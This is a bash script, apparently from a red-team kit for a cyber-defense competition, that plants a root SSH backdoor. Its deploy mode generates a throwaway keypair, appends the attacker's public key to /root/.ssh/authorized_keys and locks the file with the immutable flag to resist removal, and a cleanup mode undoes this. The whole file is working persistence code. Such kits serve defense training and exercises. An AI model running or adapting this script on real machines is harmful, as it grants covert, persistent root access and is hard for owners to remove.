#!/usr/bin/env bash
# SSH authorized_keys backdoor with immutable flag.
# Generates a throwaway keypair if ATTACKER_PUBKEY is unset.
# Detected by: defender-cli anti-persistence --ssh-keys
# Remediation blocked until: defender-cli anti-persistence --immutable
set -euo pipefail
[[ $EUID -eq 0 ]] || { echo "[!] Requires root"; exit 1; }

AUTH_KEYS="/root/.ssh/authorized_keys"
MARKER="# ccdc-rt-backdoor"

case "${1:-}" in
  deploy)
    mkdir -p /root/.ssh
    chmod 700 /root/.ssh
    chattr -i "$AUTH_KEYS" 2>/dev/null || true

    if [[ -z "${ATTACKER_PUBKEY:-}" ]]; then
      KEYFILE="/tmp/.rt_key_$(date +%s)"
      ssh-keygen -t ed25519 -f "$KEYFILE" -N "" -C "rt-backdoor" -q
      ATTACKER_PUBKEY="$(cat "${KEYFILE}.pub")"
      echo "[+] 02_ssh_backdoor: generated keypair"
      echo "[+]   Private key: ${KEYFILE}"
      echo "[+]   (copy off-box NOW — stored in /tmp)"
    fi

    touch "$AUTH_KEYS"
    if ! grep -qF "$MARKER" "$AUTH_KEYS" 2>/dev/null; then
      echo "${ATTACKER_PUBKEY} ${MARKER}" >> "$AUTH_KEYS"
    fi
    chmod 600 "$AUTH_KEYS"
    chattr +i "$AUTH_KEYS"
    echo "[+] 02_ssh_backdoor: key planted in ${AUTH_KEYS} (immutable)"
    ;;
  cleanup)
    chattr -i "$AUTH_KEYS" 2>/dev/null || true
    sed -i "/${MARKER}/d" "$AUTH_KEYS" 2>/dev/null || true
    echo "[-] 02_ssh_backdoor: key removed"
    ;;
  *) echo "Usage: $0 deploy|cleanup"; exit 1 ;;
esac
